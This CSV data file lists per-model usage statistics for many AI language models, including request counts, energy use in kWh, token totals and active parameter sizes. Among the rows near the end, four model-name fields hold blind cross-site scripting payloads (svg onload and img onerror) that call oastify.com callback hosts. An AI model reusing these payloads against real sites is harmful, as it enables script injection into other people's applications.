model_name,count,total_kwh,total_tokens,avg_kwh,avg_tokens,active_params_b
glm-4.5,5169,228.90857434409972,10692755,0.044284885731108475,2068.631263300445,32.0
claude-4-5-sonnet,16075,1953.747375737599,22332329,0.12153949460265001,1389.2584136858477,137.0
gpt-5-nano,8199,28.879255230209967,6894283,0.003522289941481884,840.8687644834736,11.0
command-a,17511,292.51921965308884,16052607,0.016704883767522632,916.7156073325339,111.0
qwen2.5-coder-32b-instruct,16937,98.4389721511003,13794815,0.005812066608673337,814.4780657731593,32.0
llama-3.1-nemotron-70b-instruct,16046,202.3473177145324,16228378,0.012610452306776293,1011.3659478997881,70.0
gemma-3n-e4b-it,8838,30.43605140828002,9491946,0.0034437713745508053,1073.9925322471147,4.0
gpt-5.1,6523,373.9083030505595,7870024,0.057321524306386554,1206.5037559405182,94.0
mixtral-8x22b-instruct-v0.1,11148,105.65977948811971,5989797,0.00947791348117328,537.2979009687837,44.0
phi-4,22216,77.49417568552042,16810454,0.0034882146059380813,756.6823010442924,14.0
qwen3-max-2025-09-23,6304,370.36282155264115,6487632,0.05875044758131998,1029.1294416243654,32.0
aya-expanse-32b,11905,62.16197256528003,8711112,0.0052215012654582135,731.7187736245276,32.0
ministral-8b-instruct-2410,20998,60.36066882465976,16019881,0.0028745913336822443,762.924135631965,8.0
llama-4-scout,14152,55.21358006256995,10974913,0.0039014683481182837,775.5026144714528,17.0
gpt-4.1-mini,19918,219.90930506374883,16697217,0.011040732255434725,838.2978712722161,75.0
mistral-small-2506,9734,47.64079458444669,7922641,0.00489426695956921,813.9142182042326,24.0
magistral-medium,5630,81.6653572212101,4102431,0.01450539204639611,728.6733570159857,123.0
gemma-3-27b,19283,152.3023233643437,23670539,0.007898269116026743,1227.5340455323342,27.0
grok-4-fast,5417,1768.526005892056,6931679,0.32647701788666345,1279.6158390252908,121.0
hermes-4-70b,6309,35.421177653333416,2840800,0.005614388596185357,450.2773815184657,70.0
deepseek-r1,9837,465.2634545149592,9893804,0.047297291299680716,1005.7745247534817,37.0
mistral-large-2411,20571,332.2091728294986,16688413,0.016149393458242116,811.2591998444412,123.0
mistral-medium-2508,13256,411.48687552557567,20670901,0.03104155669323896,1559.361873868437,123.0
magistral-small-2506,7353,28.991780405686647,4821319,0.003942850592368645,655.6941384468925,24.0
hermes-3-llama-3.1-405b,15269,2081.2330480036026,8747394,0.136304476259323,572.8858471412666,405.0
claude-3-5-sonnet-v2,13352,672.4276494255635,7686191,0.050361567512399896,575.6584032354704,137.0
mistral-saba,11488,59.90378890917973,9961971,0.005214466304768431,867.1632137883008,24.0
gemini-2.5-flash,11185,1138.663974831599,13015510,0.1018027693188734,1163.6575771122039,137.0
gemma-2-9b-it,10951,24.407630058729893,6245241,0.0022288037675764674,570.2895625970231,9.0
llama-3.1-405b,22427,5305.25069022241,22297896,0.2365564137076921,994.2433673696884,405.0
llama-3.1-8b,23816,56.11924910841989,14894197,0.0023563675305853164,625.3861689620423,8.0
gpt-5-mini,8736,86.50127568093006,9360607,0.009901702802304265,1071.498054029304,47.0
gpt-4o-mini-2024-07-18,16933,66.69773689002677,12897856,0.0039389202675265324,761.6994035315656,18.0
gpt-oss-20b,5126,25.665017854483338,8370365,0.005006831419134479,1632.9233320327742,3.0
o4-mini,7980,42.17583692018644,8155867,0.005285192596514591,1022.0384711779449,18.0
llama-3.3-70b,21703,205.36647186639888,16470516,0.009462584521328797,758.9050361701147,70.0
claude-3-7-sonnet,12712,2048.000912626195,23409695,0.16110768664460312,1841.5430302076777,137.0
claude-4-sonnet,6533,518.3796678950396,5925344,0.07934787507960196,906.9866829940303,137.0
gpt-oss-120b,5560,45.38536439385007,13560621,0.008162835322634905,2438.9606115107913,5.0
kimi-k2,3410,198.9949350782399,3485787,0.05835628594669792,1022.224926686217,32.0
gpt-5,9275,398.8379811273611,8394744,0.04300139958246481,905.093692722372,94.0
llama-maverick,7200,80.90439336903012,5360509,0.011236721301254183,744.5151388888889,17.0
gemma-3-12b,18615,94.57795283443973,21846486,0.00508073880389147,1173.5958098307817,12.0
Apertus-70B-Instruct-2509,6850,52.50467647446677,4210907,0.007664916273644784,614.7309489051095,70.0
glm-4.6,6250,297.1718826484801,13881464,0.04754750122375682,2221.03424,32.0
qwq-32b,4241,29.849544252779953,4182987,0.007038326869318546,986.3209148785663,32.0
c4ai-command-r-08-2024,14009,69.61254523874993,9211725,0.004969130219055602,657.5576415161681,35.0
qwen-3-8b,6782,43.71565745286004,11602251,0.006445835660993813,1710.7418165732822,8.0
gemma-3-4b,20697,73.4385696564796,22902936,0.00354827123044304,1106.5824032468474,4.0
chocolatine-2-14b-instruct-v2.0.3-q8,3959,4.103969502980013,1131342,0.001036617707244257,285.7645870169235,7.0
deepseek-v3-chat,13530,584.320683657,12425550,0.04318704239889135,918.370288248337,37.0
deepseek-r1-distill-llama-70b,7380,78.5250900373336,6297760,0.01064025610261973,853.3550135501355,70.0
deepseek-r1-0528,4102,299.0723261709198,6359758,0.07290890447852749,1550.404193076548,37.0
o3-mini,4138,19.099000043759972,3693321,0.004615514751996126,892.5376993716771,18.0
gemini-1.5-pro,16074,2182.8100162079936,13024224,0.1357975622874203,810.2665173572228,220.0
gpt-4.1-nano,14498,57.58165671710983,9804621,0.003971696559326102,676.274037798317,23.0
mistral-small-3.1-24b,11806,61.067009384120276,10155414,0.005172540181612763,860.1909198712519,24.0
qwen2.5-7b-instruct,3074,9.735039268733344,2683660,0.0031668963138364813,873.0188679245283,7.0
gpt-4o-2024-08-06,13073,712.7045048121615,8146576,0.05451728790730219,623.1604069456131,137.0
mistral-nemo-2407,13303,28.88836316600026,6672900,0.002171567553634538,501.6086597008194,12.0
mixtral-8x7b-instruct-v0.1,5505,15.572856902240002,3378148,0.0028288568396439605,613.6508628519528,14.0
qwen3-32b,4935,59.86206623922001,8388813,0.012130104607744684,1699.8607902735562,32.0
Qwen3-Coder-480B-A35B-Instruct,2802,76.4469828061998,2529029,0.027283005997929977,902.5799428979301,35.0
qwen3-30b-a3b,7728,37.54610902602996,12245253,0.004858450960925202,1584.5306677018634,3.0
mistral-small-24b-instruct-2501,6971,32.28430355178656,5368864,0.00463122988836416,770.1712810213743,24.0
deepseek-v3-0324,12310,688.2707527468218,14636043,0.0559115152515696,1188.9555645816408,37.0
llama-3.1-70b,12395,104.90116174980069,8413137,0.008463183682920589,678.752480839048,70.0
lfm-40b,7916,17.447642304513355,4030217,0.0022040983204286704,509.1229156139464,12.0
deepseek-chat-v3.1,5219,310.50197930366,6602809,0.059494535218175895,1265.1483042728491,37.0
minimax-m2,4084,55.5346871872,6858618,0.013598111456219393,1679.3873653281098,10.0
aya-expanse-8b,2927,7.2102221103199895,1913612,0.0024633488590092207,653.7792962077212,8.0
qwen2.5-32b-instruct,363,1.3988511822599994,196029,0.0038535845241322295,540.0247933884298,32.0
phi-3.5-mini-instruct,5566,14.438303974783365,4708895,0.0025940179616930226,846.0106000718649,3.0
gemini-2.0-flash,19646,2489.408687168767,28455211,0.12671325904350844,1448.3971800875497,137.0
grok-3-mini-beta,4421,103.08151709431992,8990859,0.02331633501341776,2033.670888939154,22.0
gemma-2-27b-it-q8,1914,7.01039931137,1089543,0.0036626955649791014,569.2492163009405,27.0
chocolatine-14b-instruct-dpo-v1.2-q4,631,1.2711375309600004,275742,0.0020144810316323303,436.99207606973056,14.0
qwen2-7b-instruct,155,0.29275564309333324,80704,0.0018887460844731177,520.6709677419354,7.0
Apertus-8B-Instruct-2509,166,0.3273516767999997,86880,0.0019719980530120466,523.3734939759037,8.0
Yi-1.5-9B-Chat,129,0.34661405416999985,88689,0.002686930652480619,687.5116279069767,9.0
jamba-1.5-large,334,13.243440129120007,278748,0.0396510183506587,834.5748502994012,94.0
mistral-small-24B-Instruct-2501,3,0.008887578573333332,1478,0.002962526191111111,492.6666666666667,24.0
claude-3-haiku,28,0.0,0,0.0,0.0,
none,2,0.0,0,0.0,0.0,
gemini-3-pro-preview,7558,630.427146493899,11726281,0.08341190083274663,1551.505821645938,45.0
grok-4.1-fast,4721,1356.2755457405674,5315877,0.2872856483246277,1126.0065664054225,121.0
mistral-large-2512,4893,501.11639804910004,9944005,0.10241495974843655,2032.2920498671572,41.0
lfm2-8b-a1b,4235,8.677199427760003,3115128,0.0020489254847131056,735.567414403778,1.0
DeepSeek-V3.2,3431,173.2136231754598,3683379,0.05048487996953069,1073.558437773244,37.0
kimi-k2-thinking,2179,187.39789082784,3282642,0.08600178560249656,1506.4901330885727,32.0
olmo-3-32b-think,2304,30.19139859442003,4230893,0.013103905639939248,1836.3250868055557,32.0
mistral-medium-3.1,466,0.0,900674,0.0,1932.7768240343348,
gpt-5.2,5031,272.58578082028,5737387,0.05418123252241701,1140.4068773603658,94.0
EuroLLM-22B-Instruct-2512,1810,2.425916115773332,423181,0.0013402851468360952,233.80165745856354,22.0
w1yz2kxp7d2u4nxrw3x444c2otumic64ysqfi37,1,0.0,0,0.0,0.0,
wnnzokjptdouqnjri3j4q4y2atgm4cs4kscf53u,1,0.0,0,0.0,0.0,
"'""><svg/onload=fetch`//vxwyyjto3cyt0mtqs2t30381ksqleb23srkec21\.oastify.com`>",1,0.0,0,0.0,0.0,
"javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/bvaewzr41sw9y2r6qirjyj6hi8o1cr0jr7jubi0X;.oastify.com/).replace(/.;/g,[])]//'src=>",1,0.0,0,0.0,0.0,
"'""><svg/onload=fetch`//l0mo19we621j3cwgvswt3tbrnitbh15tvhn4gs5\.oastify.com`>",1,0.0,0,0.0,0.0,
"javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/gk4jl4g9qxlen7gbfngonovm7dd61wpogc8z1nqX;.oastify.com/).replace(/.;/g,[])]//'src=>",1,0.0,0,0.0,0.0,
gemini-3-flash-preview,1738,142.58410113443995,1629809,0.08203918362165705,937.7497123130034,137.0
glm-4.7,1331,56.71652961534003,2649337,0.042611968155777634,1990.4861006761832,32.0
kimi-k2.5,9,0.0,0,0.0,0.0,32.0
